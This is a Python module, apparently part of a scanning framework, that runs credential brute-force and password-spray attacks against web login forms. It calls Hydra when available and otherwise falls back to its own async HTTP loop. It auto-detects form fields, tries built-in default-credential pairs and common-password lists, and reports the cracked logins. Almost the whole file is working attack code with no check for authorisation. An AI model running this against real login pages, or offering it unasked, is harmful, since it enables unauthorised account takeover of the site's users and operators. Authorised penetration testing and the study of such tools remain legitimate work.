"""
Hydra / Credential Attack Runner
---------------------------------
Runs brute-force / credential stuffing against login forms.

Strategy:
  1. If hydra is installed → run hydra (fast, parallel)
  2. Otherwise → built-in async HTTP brute force

Supports:
  - HTTP-POST form attacks (login forms)
  - HTTP Basic Auth
  - Default credential testing
  - Custom wordlist upload

Returns:
  {
    "success": bool,
    "cracked": [{"username": ..., "password": ...}],
    "tried": int,
    "method": "hydra" | "builtin",
  }
"""

import asyncio
import re
import logging
import tempfile
import os
from urllib.parse import urlparse, urlencode
from typing import Optional

import httpx

from core.tool_runner import is_available, run_tool

_log = logging.getLogger(__name__)

# ── Built-in wordlists ─────────────────────────────────────────────────────────

_COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest",
    "info", "webmaster", "support", "manager", "staff", "operator",
    "superuser", "sysadmin", "netadmin", "demo", "moderator",
    "service", "api", "dev", "developer",
]

_COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "abc123", "password1",
    "admin", "admin123", "letmein", "welcome", "monkey", "1234567890",
    "password123", "iloveyou", "sunshine", "princess", "football",
    "charlie", "aa123456", "donald", "password2", "qwerty123",
    "admin1234", "root", "test", "test123", "guest", "guest123",
    "123456789", "111111", "1234567", "123123", "pass", "pass123",
    "000000", "654321", "555555", "666666", "777777", "888888",
    "superman", "batman", "master", "hello", "login", "welcome1",
    "Admin1", "Passw0rd", "P@ssword", "P@ss123", "Qwerty123",
    # Hebrew-inspired common (for Israeli sites)
    "shalom", "israel", "123qwe", "abcd1234",
]

_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", ""),
    ("root", "toor"),
    ("root", "password"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("demo", "demo"),
    ("guest", "guest"),
    ("superadmin", "superadmin"),
    ("admin", "Admin1"),
    ("admin", "Passw0rd"),
    ("webmaster", "webmaster"),
]

# ── Helpers ────────────────────────────────────────────────────────────────────

def _parse_cookies(cookie_str: str) -> dict:
    result = {}
    for pair in (cookie_str or "").split(";"):
        pair = pair.strip()
        if "=" in pair:
            k, v = pair.split("=", 1)
            result[k.strip()] = v.strip()
    return result


def _detect_login_form(html: str, base_url: str):
    """
    Extract login form details: action URL, username field, password field.
    Returns dict or None.
    """
    # Find form
    form_match = re.search(r'<form[^>]*>(.*?)</form>', html, re.S | re.I)
    if not form_match:
        return None

    form_html = form_match.group(0)

    # Action URL
    action = re.search(r'action=["\']([^"\']+)["\']', form_html, re.I)
    action_url = action.group(1) if action else base_url

    # Normalize action URL
    if action_url.startswith("http"):
        pass
    elif action_url.startswith("/"):
        parsed = urlparse(base_url)
        action_url = f"{parsed.scheme}://{parsed.netloc}{action_url}"
    else:
        action_url = base_url.rstrip("/") + "/" + action_url

    # Method
    method_m = re.search(r'method=["\'](\w+)["\']', form_html, re.I)
    method = (method_m.group(1).upper() if method_m else "POST")

    # Fields
    inputs = re.findall(r'<input[^>]+>', form_html, re.I)
    user_field = None
    pass_field = None
    hidden_fields = {}

    for inp in inputs:
        name_m  = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
        type_m  = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
        value_m = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)

        if not name_m:
            continue

        name  = name_m.group(1)
        ftype = (type_m.group(1).lower() if type_m else "text")
        value = (value_m.group(1) if value_m else "")

        if ftype == "password":
            pass_field = name
        elif ftype == "hidden":
            hidden_fields[name] = value
        elif ftype in ("text", "email") and not user_field:
            user_field = name

    if not pass_field:
        return None

    return {
        "action": action_url,
        "method": method,
        "user_field": user_field or "username",
        "pass_field": pass_field,
        "hidden": hidden_fields,
    }


def _is_login_success(response, original_len: int, login_url: str) -> bool:
    """Heuristic: did the login succeed?"""
    # Redirect away from login page = success
    if response.status_code in (301, 302, 303):
        loc = response.headers.get("location", "")
        if loc and login_url not in loc:
            return True

    # Cookie set in response = success
    if response.cookies:
        return True

    body = response.text.lower()

    # Explicit failure strings
    FAIL_PATTERNS = [
        "invalid", "incorrect", "wrong", "failed", "error",
        "bad credentials", "unauthorized", "שגוי", "שגיאה",
        "לא נכון", "שם משתמש", "סיסמה שגויה",
    ]
    for p in FAIL_PATTERNS:
        if p in body:
            return False

    # Success strings
    SUCCESS_PATTERNS = [
        "dashboard", "welcome", "logout", "sign out", "profile",
        "my account", "logged in", "ברוך הבא", "יציאה",
    ]
    for p in SUCCESS_PATTERNS:
        if p in body:
            return True

    # Response is significantly different → might be logged in
    if original_len and abs(len(response.content) - original_len) > 500:
        return True

    return False


# ── Hydra integration ──────────────────────────────────────────────────────────

async def _run_hydra(login_url, form_info, cookies="", log=None):
    """Run hydra against a login form."""
    def _log(msg):
        if log: log(msg)

    parsed = urlparse(login_url)
    # Build hydra http-post-form string
    # Format: "/path:user=^USER^&pass=^PASS^:F=invalid"
    path = parsed.path or "/"
    user_f = form_info["user_field"]
    pass_f = form_info["pass_field"]
    hidden = "&".join(f"{k}={v}" for k, v in form_info.get("hidden", {}).items())
    post_data = f"{user_f}=^USER^&{pass_f}=^PASS^"
    if hidden:
        post_data += f"&{hidden}"

    form_str = f"{path}:{post_data}:F=Invalid"

    # Write wordlists to temp files
    user_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
    pass_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)

    user_file.write('\n'.join(_COMMON_USERNAMES))
    pass_file.write('\n'.join(_COMMON_PASSWORDS))
    user_file.close()
    pass_file.close()

    host = parsed.netloc.split(":")[0]
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    service = "https-post-form" if parsed.scheme == "https" else "http-post-form"

    cmd = [
        "hydra",
        "-L", user_file.name,
        "-P", pass_file.name,
        "-t", "16",            # 16 parallel tasks
        "-f",                  # stop on first success
        "-s", str(port),
        host,
        service,
        form_str,
    ]

    _log(f"  hydra: {host} {service} ({len(_COMMON_USERNAMES)}u × {len(_COMMON_PASSWORDS)}p)")

    try:
        stdout, stderr, rc = await run_tool(cmd, timeout=120)
    except Exception as e:
        _log(f"  hydra failed: {e}")
        return None
    finally:
        for f in (user_file.name, pass_file.name):
            try: os.unlink(f)
            except: pass

    cracked = []
    for m in re.finditer(r'login:\s*(\S+)\s+password:\s*(\S+)', stdout, re.I):
        cracked.append({"username": m.group(1), "password": m.group(2)})

    return {
        "success": bool(cracked),
        "cracked": cracked,
        "tried": len(_COMMON_USERNAMES) * len(_COMMON_PASSWORDS),
        "method": "hydra",
        "raw": stdout[:1000],
    }


# ── Built-in async brute force ─────────────────────────────────────────────────

async def _builtin_bruteforce(login_url, form_info, cookies="", auth_token="", log=None):
    """Async HTTP brute force — default credentials + common passwords."""
    def _log(msg):
        if log: log(msg)

    cookie_dict = _parse_cookies(cookies)
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,*/*",
    }
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    cracked = []
    tried   = 0

    async with httpx.AsyncClient(
        headers=headers, cookies=cookie_dict, verify=False,
        follow_redirects=False, timeout=10,
    ) as client:
        # Baseline — get original login page length
        try:
            base_r = await client.get(login_url, timeout=8)
            orig_len = len(base_r.content)
        except Exception:
            orig_len = 0

        user_f = form_info["user_field"]
        pass_f = form_info["pass_field"]
        hidden = form_info.get("hidden", {})
        action = form_info["action"]

        # Phase A: Default credentials (fast — try 22 pairs first)
        _log(f"  Phase A: Default credentials ({len(_DEFAULT_CREDS)} pairs)…")
        for username, password in _DEFAULT_CREDS:
            data = {user_f: username, pass_f: password, **hidden}
            try:
                if form_info["method"] == "POST":
                    r = await client.post(action, data=data, timeout=8)
                else:
                    r = await client.get(action, params=data, timeout=8)
                tried += 1
                if _is_login_success(r, orig_len, login_url):
                    _log(f"  CRACKED: {username}:{password}")
                    cracked.append({"username": username, "password": password})
                    return {
                        "success": True, "cracked": cracked,
                        "tried": tried, "method": "builtin",
                    }
            except Exception:
                pass
            await asyncio.sleep(0.05)  # small delay

        # Phase B: Common passwords for "admin"
        _log(f"  Phase B: Password spray on admin ({len(_COMMON_PASSWORDS)} passwords)…")
        for password in _COMMON_PASSWORDS:
            data = {user_f: "admin", pass_f: password, **hidden}
            try:
                if form_info["method"] == "POST":
                    r = await client.post(action, data=data, timeout=8)
                else:
                    r = await client.get(action, params=data, timeout=8)
                tried += 1
                if _is_login_success(r, orig_len, login_url):
                    _log(f"  CRACKED: admin:{password}")
                    cracked.append({"username": "admin", "password": password})
                    return {
                        "success": True, "cracked": cracked,
                        "tried": tried, "method": "builtin",
                    }
            except Exception:
                pass
            await asyncio.sleep(0.05)

    _log(f"  Phase B done — {tried} ניסיונות, לא נמצא")
    return {
        "success": False, "cracked": [],
        "tried": tried, "method": "builtin",
    }


# ── Entry point ────────────────────────────────────────────────────────────────

async def run_credential_attack(
    base_url: str,
    login_path: str = "/login",
    form_info: dict = None,
    cookies: str = "",
    auth_token: str = "",
    log=None,
) -> dict:
    """
    Main entry point for credential attacks.
    Detects login form if form_info not provided.
    """
    def _log(msg):
        if log: log(msg)

    login_url = base_url.rstrip("/") + login_path

    # Auto-detect form if not provided
    if not form_info:
        _log(f"  מחפש login form ב-{login_url}…")
        try:
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                r = await client.get(login_url)
                form_info = _detect_login_form(r.text, login_url)
        except Exception as e:
            _log(f"  Failed to fetch login page: {e}")
            return {"success": False, "cracked": [], "tried": 0, "error": str(e)}

        if not form_info:
            _log("  לא נמצא login form")
            return {"success": False, "cracked": [], "tried": 0, "error": "no login form found"}

    _log(f"  Login form: {form_info['action']} [{form_info['method']}]")
    _log(f"  Fields: user={form_info['user_field']} pass={form_info['pass_field']}")

    # Use hydra if available
    if is_available("hydra"):
        _log("Hydra זמין — מריץ brute force מהיר...")
        result = await _run_hydra(login_url, form_info, cookies=cookies, log=_log)
        if result is not None:
            return result

    # Built-in fallback
    _log("מריץ built-in credential attack...")
    return await _builtin_bruteforce(login_url, form_info, cookies, auth_token, log=_log)
